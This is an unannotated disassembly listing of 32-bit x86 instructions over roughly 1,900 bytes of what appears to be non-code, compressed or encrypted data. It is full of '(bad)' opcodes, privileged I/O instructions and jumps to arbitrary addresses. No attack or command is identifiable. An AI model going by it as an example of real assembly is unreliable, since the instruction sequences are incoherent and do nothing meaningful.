  419f3c:	xchg   esp,eax
  419f3d:	mov    edx,0xb049994
  419f42:	pop    edi
  419f43:	imul   esi,DWORD PTR [ecx-0x7cd538e7],0x77124a38
  419f4d:	je     0x419fbe
  419f4f:	inc    esi
  419f50:	cmp    DWORD PTR [edx+0x3d70f0ef],0xc
  419f57:	enterw 0x10ad,0xd0
  419f5c:	hlt    
  419f5d:	or     DWORD PTR ss:[edi+esi*1+0x3ae6a3d6],0x5dd18395
  419f69:	and    al,0xe9
  419f6b:	scas   eax,DWORD PTR es:[edi]
  419f6c:	enter  0x6615,0x1f
  419f70:	ret    
  419f71:	xlat   BYTE PTR ds:[ebx]
  419f72:	lds    edx,FWORD PTR [esi+0x75]
  419f75:	out    0x45,eax
  419f77:	(bad)  
  419f78:	and    eax,0x7600055c
  419f7d:	pop    ebx
  419f7e:	sub    dh,BYTE PTR [esi+edx*4]
  419f81:	ret    0x889c
  419f84:	inc    ebx
  419f85:	pop    ds
  419f86:	sub    al,0xec
  419f88:	pusha  
  419f89:	int3   
  419f8a:	test   BYTE PTR [ecx+0x21],ch
  419f8d:	nop
  419f8e:	jnp    0x419fc3
  419f90:	lods   eax,DWORD PTR ds:[esi]
  419f91:	mov    edx,esi
  419f93:	std    
  419f94:	es or  al,0x1b
  419f97:	jns    0x419f30
  419f99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f9a:	sti    
  419f9b:	idiv   bl
  419f9d:	dec    esp
  419f9e:	mov    esp,0xdd7522ad
  419fa3:	xchg   BYTE PTR [edi+esi*4],bh
  419fa6:	add    al,0xa1
  419fa8:	loope  0x419fd6
  419faa:	arpl   WORD PTR [esi-0x5c971645],dx
  419fb0:	jbe    0x419ffb
  419fb2:	pop    ebp
  419fb3:	dec    eax
  419fb4:	and    al,BYTE PTR [ebp-0x46]
  419fb7:	jnp    0x419f3c
  419fb9:	ins    BYTE PTR es:[edi],dx
  419fba:	cmc    
  419fbb:	stos   DWORD PTR es:[edi],eax
  419fbc:	mov    dh,0x96
  419fbe:	or     BYTE PTR [edi+0x5f],bh
  419fc1:	inc    esi
  419fc2:	rcl    DWORD PTR [edx+0x186abd94],0xef
  419fc9:	mov    bh,0xb
  419fcb:	dec    edx
  419fcc:	mov    DWORD PTR ds:0x6856ffe,ebx
  419fd2:	cmp    BYTE PTR [ebx-0x1b2f1d2c],ah
  419fd8:	loopne 0x419f78
  419fda:	jmp    0xc2b2:0x10a2e9
  419fe1:	cdq    
  419fe2:	shl    DWORD PTR ds:0xd053159c,1
  419fe8:	xchg   ch,bh
  419fea:	mul    BYTE PTR [edi]
  419fec:	push   eax
  419fed:	or     al,BYTE PTR [eax+0x5780f24e]
  419ff3:	loope  0x419fb1
  419ff5:	sub    bh,BYTE PTR [ecx]
  419ff7:	xlat   BYTE PTR ds:[ebx]
  419ff8:	mov    eax,ds:0x1f5d8b71
  419ffd:	add    BYTE PTR [edi],al
  419fff:	rol    DWORD PTR [esi+eax*8],1
  41a002:	mov    ds,ebp
  41a004:	cdq    
  41a005:	inc    esi
  41a006:	cmp    bl,BYTE PTR [eax]
  41a008:	inc    ecx
  41a009:	pop    edx
  41a00a:	ret    0xfd0d
  41a00d:	hlt    
  41a00e:	add    DWORD PTR [eax+0x7856fd64],0xcd908d89
  41a018:	dec    esi
  41a019:	scas   al,BYTE PTR es:[edi]
  41a01a:	ficomp DWORD PTR [ebx]
  41a01c:	xchg   edx,eax
  41a01d:	sbb    al,0xcb
  41a01f:	bound  eax,QWORD PTR [eax-0x1120c3cd]
  41a025:	xor    BYTE PTR [edx-0x67],bl
  41a028:	in     eax,dx
  41a029:	xlat   BYTE PTR ds:[ebx]
  41a02a:	and    al,0xb7
  41a02c:	pop    edx
  41a02d:	mov    ds:0xda8f84fd,eax
  41a032:	mov    edx,0x3bec5ed9
  41a037:	xlat   BYTE PTR ds:[ebx]
  41a038:	push   eax
  41a039:	(bad)  
  41a03a:	mov    bl,0x22
  41a03c:	out    0x8a,eax
  41a03e:	sub    dl,BYTE PTR [ebp+0x1d]
  41a041:	cmp    DWORD PTR [eax+0x5c],esi
  41a044:	adc    eax,0xe16863ea
  41a049:	push   edx
  41a04a:	enter  0xb0f7,0xfd
  41a04e:	jmp    0x41a0a2
  41a050:	test   BYTE PTR [ecx+ebx*4],dl
  41a053:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a054:	mov    al,ds:0xc3e0e872
  41a059:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a05a:	mov    edx,0x79f80839
  41a05f:	daa    
  41a060:	rcr    eax,0xfb
  41a063:	push   eax
  41a064:	and    al,0xd5
  41a066:	fs jns 0x41a072
  41a069:	shr    DWORD PTR [edi+0x6e389463],0x87
  41a070:	fsubr  DWORD PTR [ecx]
  41a072:	fwait
  41a073:	xor    eax,0x6c7840c1
  41a078:	adc    al,0x4f
  41a07a:	and    al,0x96
  41a07c:	lds    esp,FWORD PTR [edi+ebp*4+0x25]
  41a080:	or     al,0x3
  41a082:	jmp    0x41a007
  41a084:	push   ss
  41a085:	mov    ebx,0x41850552
  41a08a:	inc    ecx
  41a08b:	push   ss
  41a08c:	jg     0x41a093
  41a08e:	cmp    ch,BYTE PTR [ecx+0x69119409]
  41a094:	mov    ecx,DWORD PTR [ebp+0x2ef15cd0]
  41a09a:	inc    ecx
  41a09b:	push   ss
  41a09c:	(bad)  
  41a09e:	and    eax,0x7b7c01fe
  41a0a3:	call   0xa9fdb6f0
  41a0a8:	ficomp WORD PTR [esi-0x6a31c914]
  41a0ae:	adc    esp,ecx
  41a0b0:	ss push ebp
  41a0b2:	shl    BYTE PTR [edx],1
  41a0b4:	das    
  41a0b5:	xor    DWORD PTR [edx],edx
  41a0b7:	mov    bl,0x75
  41a0b9:	push   edx
  41a0ba:	cli    
  41a0bb:	(bad)  
  41a0bc:	adc    ch,dl
  41a0be:	and    WORD PTR [esi+0x74ae2895],0xffba
  41a0c6:	cs stos DWORD PTR es:[edi],eax
  41a0c8:	(bad)  
  41a0c9:	mov    eax,0xa33095ed
  41a0ce:	sub    dl,BYTE PTR [eax-0x7edcede4]
  41a0d4:	inc    esi
  41a0d5:	sub    al,BYTE PTR [eax-0x2509835e]
  41a0db:	pop    edi
  41a0dc:	xor    esp,DWORD PTR ds:0x71c303a4
  41a0e2:	inc    esp
  41a0e3:	pop    es
  41a0e4:	cmc    
  41a0e5:	scas   eax,DWORD PTR es:[edi]
  41a0e6:	les    esp,FWORD PTR [si+0x32]
  41a0ea:	jo     0x41a163
  41a0ec:	repz inc edi
  41a0ee:	or     dl,BYTE PTR [edx-0x64]
  41a0f1:	cwde   
  41a0f2:	pop    es
  41a0f3:	sbb    eax,0xba8def3d
  41a0f8:	inc    ecx
  41a0f9:	xor    dl,BYTE PTR [eax+0x7b]
  41a0fc:	loope  0x41a118
  41a0fe:	(bad)  
  41a0ff:	jns    0x41a156
  41a101:	or     eax,0x7bda105e
  41a106:	mov    edi,0xc8ca278e
  41a10b:	in     eax,dx
  41a10c:	test   esi,edx
  41a10e:	mov    cl,0x15
  41a110:	inc    DWORD PTR [edx-0x32f62b7]
  41a116:	mov    ds:0xad87f9d1,eax
  41a11b:	(bad)  [ebx+0x6cd3c501]
  41a121:	sbb    al,0xd7
  41a123:	loopne 0x41a0ad
  41a125:	jge    0x41a18c
  41a127:	repz enter 0xc9a,0x19
  41a12c:	or     al,0xc4
  41a12f:	inc    esp
  41a130:	mov    dh,0x70
  41a132:	addr16 sub ah,ch
  41a135:	sub    DWORD PTR [edi-0x12],ecx
  41a138:	sar    BYTE PTR [eax+0x1e],1
  41a13b:	pop    esi
  41a13c:	sub    bl,BYTE PTR [eax-0x4c]
  41a13f:	iret   
  41a140:	rcr    DWORD PTR [ebx],cl
  41a142:	pop    ebp
  41a143:	fs repz pop eax
  41a146:	mov    ch,0xb6
  41a148:	lods   al,BYTE PTR ds:[esi]
  41a149:	(bad)  
  41a14a:	js     0x41a136
  41a14c:	and    DWORD PTR [ebp+0x63],ecx
  41a14f:	les    esi,FWORD PTR [edi]
  41a151:	cmp    al,0xd8
  41a153:	jnp    0x41a11d
  41a155:	xchg   edx,eax
  41a156:	out    0x87,eax
  41a158:	test   eax,0xc14f8001
  41a15d:	lock stos DWORD PTR es:[edi],eax
  41a15f:	scas   eax,DWORD PTR es:[edi]
  41a160:	aam    0x86
  41a162:	and    cl,dh
  41a164:	xchg   ecx,eax
  41a165:	fimul  WORD PTR [esi+0x75]
  41a168:	cs ins DWORD PTR es:[edi],dx
  41a16a:	or     DWORD PTR [edi-0xd8b8a7],ebp
  41a170:	push   ebp
  41a171:	adc    esi,esp
  41a173:	loopne 0x41a174
  41a175:	ja     0x41a12f
  41a177:	sbb    eax,0x95dea7d6
  41a17c:	push   ecx
  41a17d:	add    al,0xb7
  41a17f:	xchg   ecx,eax
  41a180:	add    al,0x45
  41a182:	add    eax,0x8ea81113
  41a187:	inc    edi
  41a188:	push   es
  41a189:	push   eax
  41a18a:	loope  0x41a11d
  41a18c:	pop    ebp
  41a18d:	mov    ah,0x19
  41a18f:	neg    edi
  41a191:	ja     0x41a1a6
  41a193:	test   cl,cl
  41a195:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a196:	mov    eax,gs:0x124f50f4
  41a19c:	push   0xfffffff8
  41a19e:	inc    esp
  41a19f:	cli    
  41a1a0:	mov    dh,0x55
  41a1a2:	sbb    ebx,edx
  41a1a4:	mov    esi,0x786d443f
  41a1a9:	aam    0xa8
  41a1ab:	ja     0x41a190
  41a1ad:	mov    al,0x1f
  41a1af:	xlat   BYTE PTR ds:[ebx]
  41a1b0:	call   0xb1259700
  41a1b5:	inc    esi
  41a1b6:	dec    ecx
  41a1b7:	bound  ebp,QWORD PTR [ebx]
  41a1b9:	fcos   
  41a1bb:	test   BYTE PTR [ecx],al
  41a1bd:	mov    WORD PTR [edx-0x6828a2be],gs
  41a1c3:	add    DWORD PTR [ebx+0x3f7a94ba],0xffffff87
  41a1ca:	inc    esp
  41a1cb:	xor    al,0xfe
  41a1cd:	or     DWORD PTR [edi],esp
  41a1cf:	dec    eax
  41a1d0:	shr    BYTE PTR [ebp+0x51],cl
  41a1d3:	and    al,0xa5
  41a1d5:	in     eax,dx
  41a1d6:	addr16 std 
  41a1d8:	sub    bh,bl
  41a1da:	add    bh,BYTE PTR [eax-0x70ebfee3]
  41a1e0:	out    0x0,eax
  41a1e2:	fsub   QWORD PTR ds:0x18596f72
  41a1e8:	fwait
  41a1e9:	imul   ebp,DWORD PTR [eax-0x42],0xf
  41a1ed:	pop    edx
  41a1ee:	test   ebx,esi
  41a1f0:	inc    ebp
  41a1f1:	pop    ss
  41a1f2:	sub    BYTE PTR ds:0xd08757c7,0x55
  41a1f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a1fa:	hlt    
  41a1fb:	xor    al,0x3e
  41a1fd:	or     eax,DWORD PTR [edx+ecx*4-0x32da41fa]
  41a204:	mov    ah,0x8a
  41a206:	push   edi
  41a207:	lods   eax,DWORD PTR ds:[esi]
  41a208:	and    al,0x13
  41a20a:	in     al,0x32
  41a20c:	and    ebp,eax
  41a20e:	cmp    bh,BYTE PTR [ebx]
  41a210:	lds    ebx,FWORD PTR [eax]
  41a212:	inc    eax
  41a213:	jp     0x41a256
  41a215:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a216:	fmul   st(5),st
  41a218:	mov    ebp,0x569036fb
  41a21d:	dec    ecx
  41a21e:	mov    bh,0x2c
  41a220:	fadd   QWORD PTR [ebx]
  41a222:	bound  esp,QWORD PTR [edi]
  41a224:	arpl   bx,di
  41a226:	imul   edx,DWORD PTR [ebx-0x26248f3a],0xf834551e
  41a230:	das    
  41a231:	add    BYTE PTR [edx+0x1b],dh
  41a234:	cli    
  41a235:	into   
  41a236:	mov    bh,BYTE PTR [edx-0x3340445d]
  41a23c:	xor    BYTE PTR [edx-0x697bca0b],0x8e
  41a243:	pop    eax
  41a244:	test   BYTE PTR [edi+0x562e9c23],ch
  41a24a:	loopne 0x41a23c
  41a24c:	or     DWORD PTR [eax+0x63],eax
  41a24f:	ret    0x2e85
  41a252:	mov    eax,0x7c49b4e4
  41a257:	rcl    DWORD PTR [eax+ecx*8+0x22d32dc4],1
  41a25e:	outs   dx,DWORD PTR ds:[esi]
  41a25f:	and    bh,ah
  41a261:	push   0xffffffb1
  41a263:	mov    esi,0x7a656060
  41a268:	push   es
  41a269:	(bad)  
  41a26a:	pop    ebp
  41a26b:	xor    al,0x26
  41a26d:	enter  0x4ff9,0x6a
  41a271:	mov    dh,0xab
  41a273:	aam    0x86
  41a275:	js     0x41a23e
  41a277:	mov    ds,WORD PTR [eax]
  41a279:	sbb    esp,DWORD PTR [ebp+0x22bc97e0]
  41a27f:	jg     0x41a2f2
  41a281:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a282:	bound  edi,QWORD PTR [edx]
  41a284:	shr    BYTE PTR [ecx+ebp*8+0x26],cl
  41a288:	mov    ebp,0xdde5e5fa
  41a28d:	xor    DWORD PTR [ebp+0x64],ebp
  41a290:	push   cs
  41a291:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a292:	pusha  
  41a293:	xchg   edx,eax
  41a294:	das    
  41a295:	xchg   ebx,eax
  41a296:	or     edx,DWORD PTR [edx-0x2f]
  41a299:	cld    
  41a29a:	sub    BYTE PTR [edi+ebx*4-0x423ebba1],bl
  41a2a1:	clc    
  41a2a2:	push   esi
  41a2a3:	push   ecx
  41a2a4:	sbb    eax,0x746429ec
  41a2a9:	arpl   WORD PTR [edi-0x2c052b04],bp
  41a2af:	dec    edi
  41a2b0:	cmp    al,0xe0
  41a2b2:	xchg   edx,eax
  41a2b3:	sbb    eax,0x6aefac34
  41a2b8:	fmul   st,st(6)
  41a2ba:	int3   
  41a2bb:	(bad)  
  41a2bc:	mov    ch,0x6c
  41a2be:	jle    0x41a306
  41a2c0:	dec    ecx
  41a2c1:	xlat   BYTE PTR ds:[ebx]
  41a2c2:	aaa    
  41a2c3:	aam    0x89
  41a2c5:	push   ds
  41a2c6:	mov    bl,0x26
  41a2c8:	mov    esp,cs
  41a2ca:	jl     0x41a33b
  41a2cc:	xor    al,0x47
  41a2ce:	mov    cl,0x7e
  41a2d0:	push   0x2d5909de
  41a2d5:	lods   eax,DWORD PTR ds:[esi]
  41a2d6:	xchg   ebp,eax
  41a2d7:	pop    ss
  41a2d8:	cs inc edi
  41a2da:	rcr    BYTE PTR [edx],1
  41a2dc:	mov    eax,ds:0x64bfb7ab
  41a2e1:	aas    
  41a2e2:	setbe  BYTE PTR [esp+eax*2+0x54c056]
  41a2ea:	mov    ebp,0xe154a50d
  41a2ef:	out    dx,al
  41a2f0:	outs   dx,DWORD PTR ds:[esi]
  41a2f1:	sbb    eax,0x5300fd94
  41a2f6:	pop    ds
  41a2f7:	add    BYTE PTR [eax+ebp*4],bh
  41a2fa:	in     al,dx
  41a2fb:	rol    DWORD PTR [eax-0x14],cl
  41a2fe:	test   eax,0x27b69d95
  41a303:	sub    DWORD PTR [edi],edi
  41a305:	sub    ch,BYTE PTR ds:0xc81e3136
  41a30b:	aaa    
  41a30c:	sub    al,0xfa
  41a30e:	aaa    
  41a30f:	cli    
  41a310:	inc    ecx
  41a311:	sbb    al,BYTE PTR [ecx-0x6fb028c8]
  41a317:	add    BYTE PTR ds:0x19e57832,0x8a
  41a31e:	ror    BYTE PTR [edx-0x6e386115],0x4
  41a325:	arpl   WORD PTR [eax-0x6a],sp
  41a328:	adc    eax,0x1cf1af2c
  41a32d:	pop    edx
  41a32e:	dec    edi
  41a32f:	adc    ch,BYTE PTR [esi+0xc]
  41a332:	scas   eax,DWORD PTR es:[edi]
  41a333:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a334:	aad    0xe3
  41a336:	mov    BYTE PTR [eax+0x5dcc184b],0x23
  41a33d:	loop   0x41a2d7
  41a33f:	dec    ecx
  41a340:	mov    al,0x27
  41a342:	rol    DWORD PTR [edx-0x69cc4bc6],cl
  41a348:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a349:	push   esi
  41a34a:	mov    ah,0xb
  41a34c:	pop    ss
  41a34d:	pop    ecx
  41a34e:	or     DWORD PTR [esi+0x29],esp
  41a351:	jecxz  0x41a2e1
  41a353:	add    BYTE PTR [edi+0x28f927e1],al
  41a359:	(bad)  
  41a35a:	iret   
  41a35b:	jns    0x41a356
  41a35d:	mov    eax,0x256813d
  41a362:	scas   al,BYTE PTR es:[edi]
  41a363:	sahf   
  41a364:	dec    ebx
  41a365:	pop    ds
  41a366:	scas   al,BYTE PTR es:[edi]
  41a367:	xor    al,0x1
  41a369:	adc    DWORD PTR [ebx-0x6be08a76],ecx
  41a36f:	sub    al,0x36
  41a371:	jno    0x41a37d
  41a373:	pushf  
  41a374:	cmc    
  41a375:	mov    ds:0x26a478ec,al
  41a37a:	mov    es,WORD PTR [edi+ebx*2]
  41a37d:	into   
  41a37e:	out    0x53,ax
  41a381:	test   al,0xd1
  41a383:	dec    ebx
  41a384:	sub    al,0xe3
  41a386:	arpl   sp,si
  41a388:	cmp    al,0x9c
  41a38a:	outs   dx,BYTE PTR ds:[esi]
  41a38b:	or     eax,0xd342f8e8
  41a390:	cmc    
  41a391:	sbb    eax,0x6b5aca7e
  41a396:	lods   eax,DWORD PTR ds:[esi]
  41a397:	push   0x79d40cd5
  41a39c:	lds    esi,FWORD PTR [edi+0x17df21a6]
  41a3a2:	add    BYTE PTR [esi],dl
  41a3a4:	loope  0x41a3a4
  41a3a6:	sbb    DWORD PTR [ecx+0x1f9bc04b],esi
  41a3ac:	int    0x24
  41a3ae:	push   0xa
  41a3b0:	and    eax,0xa45e83a3
  41a3b5:	jbe    0x41a344
  41a3b7:	std    
  41a3b8:	or     dh,BYTE PTR [esi-0x1e]
  41a3bb:	fst    DWORD PTR [edx+0x7e48c97d]
  41a3c1:	stos   BYTE PTR es:[edi],al
  41a3c2:	fadd   QWORD PTR [ebx-0x308a0285]
  41a3c8:	mov    ebx,0x1720d611
  41a3cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a3ce:	bound  edx,QWORD PTR [eax+eax*1-0x72]
  41a3d2:	sub    DWORD PTR [eax-0x3973023b],esi
  41a3d8:	idiv   DWORD PTR [eax+0x5c]
  41a3db:	rcl    BYTE PTR [ebx],1
  41a3dd:	pushf  
  41a3de:	das    
  41a3df:	sub    eax,0x2385397b
  41a3e4:	push   ebx
  41a3e5:	sbb    ebp,edx
  41a3e7:	iret   
  41a3e8:	add    eax,0x7762624b
  41a3ed:	iret   
  41a3ee:	inc    ecx
  41a3ef:	push   0xffffff8d
  41a3f1:	les    ebx,FWORD PTR [edi-0x6b]
  41a3f4:	out    dx,al
  41a3f5:	(bad)  
  41a3f6:	inc    ebx
  41a3f7:	jg     0x41a38a
  41a3f9:	and    DWORD PTR [esi-0x3b1aa61f],ebp
  41a3ff:	call   0x66a2738
  41a404:	in     eax,0x21
  41a406:	aam    0x9d
  41a408:	jl     0x41a408
  41a40a:	cwde   
  41a40b:	and    BYTE PTR [ebp+0x3b73beba],cl
  41a411:	push   ax
  41a413:	inc    ebp
  41a414:	mov    ch,0x45
  41a416:	xchg   DWORD PTR [ecx+0x1b],ecx
  41a419:	es inc edx
  41a41b:	sbb    BYTE PTR [edi-0x46e77d89],bh
  41a421:	inc    edi
  41a422:	mov    DWORD PTR [esi-0x230c5bb8],edi
  41a428:	lea    eax,[edx]
  41a42a:	js     0x41a3fd
  41a42c:	scas   al,BYTE PTR es:[edi]
  41a42d:	clc    
  41a42e:	push   ebp
  41a42f:	jg     0x41a428
  41a431:	cmp    BYTE PTR [edx-0x21],ah
  41a434:	xchg   esi,eax
  41a435:	cmp    al,cl
  41a437:	cmp    al,0x1d
  41a439:	mov    ebp,0xb541b1fa
  41a43e:	pop    ds
  41a43f:	push   cs
  41a440:	loopne 0x41a44e
  41a442:	xor    BYTE PTR [eax+ecx*1-0x6016df46],0xa4
  41a44a:	pop    eax
  41a44b:	xchg   esp,eax
  41a44c:	mov    al,ds:0x589942b4
  41a451:	scas   eax,DWORD PTR es:[edi]
  41a452:	clc    
  41a453:	(bad)  
  41a454:	cmp    dh,BYTE PTR [edx]
  41a456:	xchg   esi,ebx
  41a458:	icebp  
  41a459:	jmp    0xaee97985
  41a45e:	dec    dx
  41a460:	enter  0x8884,0x31
  41a464:	repnz sub BYTE PTR [eax-0x30],dh
  41a468:	adc    DWORD PTR [edi+0x1f],0xffffffa1
  41a46c:	das    
  41a46d:	das    
  41a46e:	repnz or eax,0xf8bb6eb7
  41a474:	and    eax,0xbbb0f1e2
  41a479:	rol    BYTE PTR [ebx],0x7
  41a47c:	mov    ah,0xb1
  41a47e:	jnp    0x41a425
  41a480:	enter  0x847e,0xa6
  41a484:	sahf   
  41a485:	pop    eax
  41a486:	sbb    al,0xce
  41a488:	jb     0x41a4e4
  41a48a:	jbe    0x41a4a5
  41a48c:	rol    DWORD PTR [eax-0x1cd3ec49],cl
  41a492:	mov    edx,0x2b3f7518
  41a497:	inc    eax
  41a498:	jae    0x41a442
  41a49a:	xor    al,dl
  41a49c:	stc    
  41a49d:	xchg   edi,eax
  41a49e:	inc    ecx
  41a49f:	sub    ebx,DWORD PTR [edx+0xc3e0e46]
  41a4a5:	scas   eax,DWORD PTR es:[edi]
  41a4a6:	cmp    DWORD PTR [edx+ebx*4-0x1b],0xc03208d6
  41a4ae:	sbb    DWORD PTR [edi-0x26],ecx
  41a4b1:	fwait
  41a4b2:	cmp    al,BYTE PTR [ebx+edx*2]
  41a4b5:	jne    0x41a443
  41a4b7:	shl    ecx,0xb0
  41a4ba:	jae    0x41a4e9
  41a4bc:	mov    ch,0x47
  41a4be:	sub    al,ah
  41a4c0:	retf   
  41a4c1:	sbb    BYTE PTR [ecx-0x65042579],ch
  41a4c7:	jmp    0x13ea09c4
  41a4cc:	into   
  41a4cd:	leave  
  41a4ce:	sub    DWORD PTR [eax-0x3cde3067],eax
  41a4d4:	shr    bl,1
  41a4d6:	jg     0x41a49c
  41a4d8:	call   0x5ba1:0xb5c802a7
  41a4df:	and    eax,0x8260c668
  41a4e4:	leave  
  41a4e5:	add    al,0xa1
  41a4e7:	jae    0x41a51a
  41a4e9:	push   esp
  41a4ea:	shl    DWORD PTR [ebp+edx*2+0x6e],cl
  41a4ee:	jle    0x41a538
  41a4f0:	sbb    al,0x5f
  41a4f2:	call   0x94ba2cc2
  41a4f7:	jbe    0x41a494
  41a4f9:	pop    ds
  41a4fa:	ss in  eax,dx
  41a4fc:	and    dl,BYTE PTR [ecx]
  41a4fe:	pop    ebx
  41a4ff:	stos   DWORD PTR es:[edi],eax
  41a500:	cmp    al,0x75
  41a502:	inc    edi
  41a503:	dec    edx
  41a504:	dec    ecx
  41a505:	mov    BYTE PTR [esi],bl
  41a507:	enter  0xc4fc,0x2e
  41a50b:	mov    esp,0xec53e684
  41a510:	mov    cl,0xe1
  41a512:	mov    ds:0x98299085,ax
  41a518:	push   edi
  41a519:	int3   
  41a51a:	(bad)  
  41a51b:	aam    0x5
  41a51d:	sub    BYTE PTR [ecx+0x2e0488f6],ch
  41a523:	sti    
  41a524:	mov    esi,0xe432a60
  41a529:	sub    eax,esp
  41a52b:	repz stc 
  41a52d:	cmp    esp,edx
  41a52f:	adc    BYTE PTR [ecx],dl
  41a531:	mov    ah,0x26
  41a533:	sbb    al,0xfc
  41a535:	js     0x41a589
  41a537:	jns    0x41a57a
  41a539:	xchg   BYTE PTR [ecx-0x5b],bl
  41a53c:	pushf  
  41a53d:	test   esi,0x1ba2b9f6
  41a543:	aam    0x7a
  41a545:	mov    edx,0x69b672a8
  41a54a:	jecxz  0x41a505
  41a54c:	das    
  41a54d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a54e:	(bad)  
  41a54f:	mov    ebp,0xfbfed8d6
  41a554:	lock mov eax,0xedfb1129
  41a55a:	(bad)  
  41a55b:	fwait
  41a55c:	push   ecx
  41a55d:	inc    edx
  41a55e:	sub    bh,bh
  41a560:	into   
  41a561:	jecxz  0x41a558
  41a563:	sar    BYTE PTR [edx+0x2e],0x41
  41a567:	loop   0x41a527
  41a569:	jle    0x41a530
  41a56b:	and    al,0xde
  41a56d:	pop    ecx
  41a56e:	sub    esi,DWORD PTR [edx-0x13]
  41a571:	xchg   ecx,eax
  41a572:	(bad)
  41a575:	ja     0x41a5cb
  41a577:	sbb    DWORD PTR [eax],ebx
  41a579:	push   0x7cc3120e
  41a57e:	xchg   DWORD PTR ds:0x6687,esp
  41a583:	lods   al,BYTE PTR ds:[esi]
  41a584:	aad    0x10
  41a586:	cmp    BYTE PTR [edx+ebx*4-0x497b8e34],ah
  41a58d:	dec    edx
  41a58e:	xor    al,0x49
  41a590:	retf   
  41a591:	fs inc ecx
  41a593:	lock rcr DWORD PTR [esp+ebp*8+0x26],1
  41a598:	mov    esi,fs
  41a59a:	pop    edx
  41a59b:	lods   eax,DWORD PTR ds:[esi]
  41a59c:	mov    edx,0xd9f83c6e
  41a5a1:	leave  
  41a5a2:	fld    QWORD PTR [ecx]
  41a5a4:	inc    ebx
  41a5a5:	mov    al,ds:0x7b7464c0
  41a5aa:	jge    0x41a5b2
  41a5ac:	pushw  0xffce
  41a5af:	dec    edx
  41a5b0:	sbb    DWORD PTR [ecx-0xd],ebx
  41a5b3:	dec    edi
  41a5b4:	push   ebx
  41a5b5:	dec    eax
  41a5b6:	test   BYTE PTR [ebx+0x4921ea9b],al
  41a5bc:	loop   0x41a543
  41a5be:	push   edx
  41a5bf:	fistp  QWORD PTR [edx]
  41a5c1:	sub    edi,ebx
  41a5c3:	jmp    0x221a:0x70f646b3
  41a5ca:	or     al,0x64
  41a5cc:	out    0x40,al
  41a5ce:	shl    esp,cl
  41a5d0:	or     BYTE PTR [edx+0x2a],dh
  41a5d3:	jecxz  0x41a63b
  41a5d5:	shr    al,0xa2
  41a5d8:	inc    ebx
  41a5d9:	nop
  41a5da:	push   0x613e35c0
  41a5df:	jae    0x41a61d
  41a5e1:	mov    edx,0x4c7f2fb0
  41a5e6:	mov    BYTE PTR [edx-0x6f0f6e3b],dl
  41a5ec:	retf   
  41a5ed:	xchg   ebp,eax
  41a5ee:	pop    es
  41a5ef:	or     al,0x1c
  41a5f1:	ret    0xdc0b
  41a5f4:	loop   0x41a58e
  41a5f6:	pop    ss
  41a5f7:	jbe    0x41a593
  41a5f9:	xchg   DWORD PTR [edi-0x46a3bcab],ebx
  41a5ff:	mov    ebp,0x7f6cae33
  41a604:	fcmovnb st,st(7)
  41a606:	sbb    al,0x92
  41a608:	sbb    bh,ch
  41a60a:	test   al,0x47
  41a60c:	mov    ch,0xec
  41a60e:	xlat   BYTE PTR ds:[ebx]
  41a60f:	in     al,0xd1
  41a611:	fucomi st,st(6)
  41a613:	test   eax,0x9753ea9c
  41a618:	sub    bl,bh
  41a61a:	sub    eax,ecx
  41a61c:	push   ds
  41a61d:	mov    edi,0x25897354
  41a622:	or     BYTE PTR [edx-0x7b],bl
  41a625:	pushf  
  41a626:	stos   DWORD PTR es:[edi],eax
  41a627:	ret    
  41a628:	push   edi
  41a629:	jne    0x41a5c8
  41a62b:	ret    0xf57f
  41a62e:	or     DWORD PTR [ecx-0x3b],0x2b70f3ca
  41a635:	cs jecxz 0x41a660
  41a638:	mov    ds:0x3c12bbd6,eax
  41a63d:	aas    
  41a63e:	jp     0x41a621
  41a640:	das    
  41a641:	imul   ebx,DWORD PTR [edi-0x513f2b62],0x312449c9
  41a64b:	add    eax,0x4c5f1a43
  41a650:	enter  0xd161,0x3b
  41a654:	hlt    
  41a655:	mov    ds:0x1416cc02,al
  41a65a:	shr    BYTE PTR [ecx],0x1a
  41a65d:	jg     0x41a645
  41a65f:	sub    esp,ebx
  41a661:	jns    0x41a639
  41a663:	test   DWORD PTR [edi-0x3a],edi
  41a666:	add    edi,edi
  41a668:	ins    BYTE PTR es:[edi],dx
  41a669:	mov    ds:0x98d6eb4c,eax
  41a66e:	mov    BYTE PTR [ebx-0x39],al
  41a671:	mov    eax,0x150ba838
  41a676:	es xchg edi,eax
  41a678:	xor    BYTE PTR [ebp+0x69c3a68d],ah
  41a67e:	xor    dl,BYTE PTR [edi]
  41a680:	xchg   esp,eax
  41a681:	pop    ebp
  41a682:	push   ss
  41a683:	scas   al,BYTE PTR es:[edi]
  41a684:	loope  0x41a6d7
  41a686:	push   DWORD PTR [edx+0x39]
  41a689:	jns    0x41a63d
  41a68b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a68c:	sbb    BYTE PTR [ebp+0x64ad780],ch
  41a692:	sub    eax,DWORD PTR [ebx+eiz*8+0x7da5d8d8]
  41a699:	mov    dl,0x7c
  41a69b:	mov    dh,0x32
  41a69d:	lea    edi,[ebx+edi*4+0x18]
  41a6a1:	ja     0x41a698
  41a6a3:	in     al,dx
  41a6a4:	xchg   ebp,eax
  41a6a5:	sub    eax,0x9d2932c7
  41a6aa:	aas    
  41a6ab:	repnz test DWORD PTR [ebx],esi
  41a6ae:	mov    al,0x5
  41a6b0:	xchg   esp,eax
  41a6b1:	dec    edx
  41a6b2:	fwait
  41a6b3:	push   esi
  41a6b4:	xchg   edx,eax
  41a6b5:	mov    dl,0xd9
  41a6b7:	sub    esi,eax
  41a6b9:	js     0x41a72e
  41a6bb:	test   BYTE PTR [esi-0x4b],ch
  41a6be:	xchg   esi,eax
  41a6bf:	adc    al,0x33
  41a6c1:	aam    0x94
  41a6c3:	sub    eax,0xf8a6ac05
  41a6c8:	imul   edi,DWORD PTR [ebp-0x3fda3a32],0x50
